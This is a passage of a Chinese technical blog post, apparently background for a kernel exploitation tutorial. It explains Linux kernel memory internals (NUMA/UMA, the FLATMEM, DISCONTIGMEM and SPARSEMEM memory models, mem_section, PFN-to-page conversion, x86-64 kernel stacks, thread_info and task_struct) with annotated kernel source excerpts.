class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="comment">/* 页的扩展属性。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Must be held any time you expect node_start_pfn,</span></span><br><span class="line"><span class="comment">	 * node_present_pages, node_spanned_pages or nr_zones to stay constant.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment">	 * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">	 * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*  起始物理页号。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="comment">/* 物理页总数（不包括空洞）。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* total number of physical pages */</span></span><br><span class="line">    <span class="comment">/* 物理页总数（包括空洞）。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* total size of physical page range, including holes */</span></span><br><span class="line">	<span class="comment">/* 节点标识符。 */</span></span><br><span class="line">    <span class="type">int</span> node_id;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>	<span class="comment">/* Protected by</span></span><br><span class="line"><span class="comment">					   mem_hotplug_begin/end() */</span></span><br><span class="line">	<span class="type">int</span> kswapd_order;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_classzone_idx</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> kswapd_failures;		<span class="comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">	<span class="type">int</span> kcompactd_max_order;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_classzone_idx</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is a per-node reserve of pages that are not available</span></span><br><span class="line"><span class="comment">	 * to userspace allocations.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * zone reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		min_unmapped_pages;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line">	<span class="type">spinlock_t</span>		lru_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment">	 * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">	<span class="type">spinlock_t</span> split_queue_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">split_queue</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> split_queue_len;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>		<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		flags;</span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Per-node vmstats */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="内存架构"><a href="#内存架构" class="headerlink" title="内存架构"></a>内存架构</h3><h4 id="UMA"><a href="#UMA" class="headerlink" title="UMA"></a>UMA</h4><p>UMA（Uniform Memory Access）架构指的是内存有统一的结构并且可以统一寻址。又名 Symmetrical  Multi-Processing，简称SMP，即对称多处理技术，SMP 对称多处理系统内有许多紧耦合多处理器，在这样的系统中，所有的CPU共享全部资源，如总线，内存和I&#x2F;O系统等，操作系统或管理数据库的复本只有一个，这种系统有一个最大的特点就是共享所有资源。多个CPU之间没有区别，平等地访问内存、外设、一个操作系统。操作系统管理着一个队列，每个处理器依次处理队列中的进程。如果两个处理器同时请求访问一个资源（例如同一段内存地址），由硬件、软件的锁机制去解决资源争用问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/uma.png"
                      alt="uma"
                ></p>
<h4 id="NUMA"><a href="#NUMA" class="headerlink" title="NUMA"></a>NUMA</h4><p>NUMA（Non-Uniform Memory Access）架构指的是系统中有多个节点和多个簇，CPU访问本地内存节点的速度最快，访问远端的内存节点的速度要慢一些。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/numa.png"
                      alt="numa"
                ></p>
<h3 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h3><p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/452891440" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Linux 提供了三种内存模型，分别是FLATMEM、DISCONTIGMEM、SPARSEMEM。定义于 <code>include/asm-generic/memory_model.h</code> 中。Linux当前默认使用SPARSEMEM模型。</p>
<h4 id="FLATMEM"><a href="#FLATMEM" class="headerlink" title="FLATMEM"></a>FLATMEM</h4><p>平滑内存模型。物理内存地址连续，通过简单的线性映射将物理内存页与一个数组 mem_map 对应起来。如下图的模型所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/flatmem.webp"
                      alt="flatmem"
                ></p>
<p>从图中可以看出，使用FLATMEM的模型非常高效和简单，直接将物理页通过线性映射与mem_map对应起来。但这种模型有个致命的问题，就是在存在大量空洞内存的场景下，mem_map数组可能会很大，造成内存浪费。</p>
<h4 id="DISCONTIGMEM"><a href="#DISCONTIGMEM" class="headerlink" title="DISCONTIGMEM"></a>DISCONTIGMEM</h4><p>为了解决不连续内存（NUMA架构）造成的内存浪费问题，Linux在1999年引入了一种新的内存模型，这就是DISCONTIGMEM。其是通过编译的时候设置CONFIG_DISCONTIGMEM配置项来开启的。针对FLATMEM模型在不连续内存带来的浪费，DISCONTIGMEM的解决思路也挺简单的，就是每个不连续的node都维护一个mem_map，而不是使用一个全局的mem_map，这样就避免mem_map有大量的空洞地址映射。具体模型参考下图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/DISCONTIGMEM.webp"
                      alt="DISCONTIGMEM"
                ></p>
<p>对于每一段连续的物理内存，都有一个 <code>pglist_data</code> 结构体进行对应，其成员 <code>node_mem_map</code> 为一个 <code>struct page</code> 指针，指向一个 <code>page</code> 结构体数组，由该结构体对应到该段连续物理内存。有一个全局变量 <code>node_data</code> 为一个 <code>pglist_data</code> 数组，其中存放着指向每一个 <code>pglist_data</code> ，该数组的大小为 <code>MAX_NUMNODES</code> 。</p>
<h4 id="SPARSEMEM"><a href="#SPARSEMEM" class="headerlink" title="SPARSEMEM"></a>SPARSEMEM</h4><p>DISCONTIGMEM模型同样存在不小的弊端：紧凑型线性映射和不支持内存热拔插。DISCONTIGMEM模型本质是一个node上的FLATMEM，随着node的增加或者内存热拔插长场景的出现，同一个node内，也可能出现大量不连续内存，导致DISCONTIGMEM模型开销越来越大。这时候，一个全新的稀松内存模型(sparse memory model)被引入到内核中。下面是其模型图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/SPARSEMEM.webp"
                      alt="SPARSEMEM"
                ></p>
<p>在一个 <code>mem_section</code> 结构体中存在一个 <code>section_mem_map</code> 成员指向一个 <code>struct page</code> 数组对应一段连续的物理内存，即将内存按照 <code>section</code> 为单位进行分段。存在一个全局指针数组 <code>mem_section</code> （与结构体同名）存放所有的 <code>mem_section</code> 指针，指向理论上支持的内存空间，每个 <code>section</code> 对应的物理内存不一定存在，若不存在则此时该 <code>section</code> 的指针为 NULL 。</p>
<h4 id="SPARSEMEM-数据结构"><a href="#SPARSEMEM-数据结构" class="headerlink" title="SPARSEMEM 数据结构"></a>SPARSEMEM 数据结构</h4><p> <code>mem_section</code> 结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is, logically, a pointer to an array of struct</span></span><br><span class="line"><span class="comment">	 * pages.  However, it is stored with some other magic.</span></span><br><span class="line"><span class="comment">	 * (see sparse.c::sparse_init_one_section())</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Additionally during early boot we encode node id of</span></span><br><span class="line"><span class="comment">	 * the location of the section here to guide allocation.</span></span><br><span class="line"><span class="comment">	 * (see sparse.c::memory_present())</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Making it a UL at least makes someone do a cast</span></span><br><span class="line"><span class="comment">	 * before using it wrong.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> section_mem_map;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* See declaration of similar field in struct zone */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If SPARSEMEM, pgdat doesn&#x27;t have page_ext pointer. We use</span></span><br><span class="line"><span class="comment">	 * section. (see page_ext.h about this.)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">page_ext</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> pad;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * WARNING: mem_section must be a power-of-2 in size for the</span></span><br><span class="line"><span class="comment">	 * calculation and use of SECTION_ROOT_MASK to make sense.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>mem_section</code> 变量定义于 <code>/mm/sparse.c</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> **<span class="title">mem_section</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> <span class="title">mem_section</span>[<span class="title">NR_SECTION_ROOTS</span>][<span class="title">SECTIONS_PER_ROOT</span>]</span></span><br><span class="line"><span class="class">	____<span class="title">cacheline_internodealigned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>若未开启 <code>CONFIG_SPARSEMEM_EXTREME</code> 编译选项则 <code>mem_section</code> 为一个常规的二维数组，否则为一个二级指针，其所指向空间内存动态分配。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/mem_section.png"
                      alt="mem_section"
                ></p>
<p>kernel 中提供了两个用以在 PFN（Page Frame Numer） 与 <code>page</code> 结构体之间进行转换的宏，定义于 <code>/include/asm-generic/memory_model.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">nr_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">nr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line">	<span class="keyword">if</span> (!mem_section)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (!mem_section[SECTION_NR_TO_ROOT(nr)])</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> &amp;mem_section[SECTION_NR_TO_ROOT(nr)][nr &amp; SECTION_ROOT_MASK];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">pfn_to_section_nr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> pfn)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">page_to_section</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">pfn_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">section_mem_map_addr</span>(<span class="keyword">struct</span> <span class="title">mem_section</span> *<span class="title">section</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="built_in">map</span> = section-&gt;section_mem_map;</span><br><span class="line">	<span class="built_in">map</span> &amp;= SECTION_MAP_MASK;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> page *)<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SPARSEMEM)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note: section&#x27;s mem_map is encoded to reflect its start_pfn.</span></span><br><span class="line"><span class="comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __page_to_pfn(pg)					\</span></span><br><span class="line"><span class="meta">(&#123;	const struct page *__pg = (pg);				\</span></span><br><span class="line"><span class="meta">	int __sec = page_to_section(__pg);			\</span></span><br><span class="line"><span class="meta">	(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));	\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __pfn_to_page(pfn)				\</span></span><br><span class="line"><span class="meta">(&#123;	unsigned long __pfn = (pfn);			\</span></span><br><span class="line"><span class="meta">	struct mem_section *__sec = __pfn_to_section(__pfn);	\</span></span><br><span class="line"><span class="meta">	__section_mem_map_addr(__sec) + __pfn;		\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_FLATMEM/DISCONTIGMEM/SPARSEMEM */</span></span></span><br></pre></td></tr></table></figure></div>

<p>因此 <code>pfn</code> 与 <code>page</code> 的转换关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/pfn.png"
                      alt="pfn"
                ></p>
<p>基于Sparse Memory 内存模型上引入了 vmemmap 的概念，是目前 Linux 最常用的内存模型之一。在开启了 vmemmap 之后，所有的 <code>mem_section</code> 中的 <code>page</code> 都抽象到一个虚拟数组 vmemmap 中，这样在进行 <code>struct page *</code> 和 <code>pfn</code> 转换时，直接使用 vmemmap 数组即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/vmemmap.png"
                      alt="vmemmap"
                ></p>
<h3 id="内核栈"><a href="#内核栈" class="headerlink" title="内核栈"></a>内核栈</h3><p>可以先来了解一下内核空间地址布局，详细可以参考这两个链接 <a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/613004422" >first<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 和 <a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt" >second<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，内核栈可以参考 <a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/kernel-stacks" >third<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<p>虽然<code>x86_64</code>的物理地址范围为<code>64bit</code>，但是因为地址空间太大目前不可能完全用完，当前支持<code>48bit</code>和<code>57bit</code>两种虚拟地址模式，也就是四级页表和五级页表，内核常用的还是四级页表。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/x86-64-kernel-layout.png"
                      alt="x86-64-kernel-layout"
                ></p>
<h4 id="x86-64-的内核栈"><a href="#x86-64-的内核栈" class="headerlink" title="x86-64 的内核栈"></a>x86-64 的内核栈</h4><p><code>x86_64</code>页大小(PAGE_SIZE)是<code>4K</code>。与所有其他体系结构一样，<code>x86_64</code>给每个存活的线程都分配一个内核栈。这些线程栈都是<code>THREAD_SIZE (2*PAGE_SIZE)</code>大的。这些堆栈包含有用的数据，只要线程活着或是一个僵尸线程。当线程在用户空间时，除了底部的<code>thread_info</code>结构，内核栈为空。</p>
<p><strong>thread_info &amp;&amp; task_struct</strong></p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arch/x86/include/asm/thread_info.h</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">thread_info</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;		<span class="comment">/* low level flags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> syscall_work;	<span class="comment">/* SYSCALL_WORK_ flags */</span></span><br><span class="line">	u32 status;		<span class="comment">/* thread synchronous flags */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	u32 cpu;		<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux kernel 6.0</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">task_struct</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For reasons of header soup (see current_thread_info()), this</span></span><br><span class="line"><span class="comment">	 * must be the first element of task_struct.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">thread_info</span>		thread_info;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			__state;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PREEMPT_RT</span></span><br><span class="line">	<span class="comment">/* saved state for &quot;spinlock sleepers&quot; */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			saved_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This begins the randomizable portion of task_struct. Only</span></span><br><span class="line"><span class="comment">	 * scheduling-critical items should be added above here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	randomized_struct_fields_start</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>				*stack;</span><br><span class="line">	<span class="type">refcount_t</span>			usage;</span><br><span class="line">	<span class="comment">/* Per task flags (PF_*), defined further below: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			ptrace;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><em>这是 <code>task_struct</code> 结构体的完整代码：<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.6/source/include/linux/sched.h#L743" >task_struct<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></em></p>
<p><code>thread_info</code> 结构存储在内核栈中，这种方式是最经典的。因为 <code>task_struct</code> 结构从<code>1.0</code>到现在<code>5.0</code>内核此结构一直在增大。如果将此结构放在内核栈中则很浪费内核栈的空间，<code>thread_info</code>结构中有一个<code>task_struct</code> 的指针避免了内核栈空间过大。</p>
<hr>
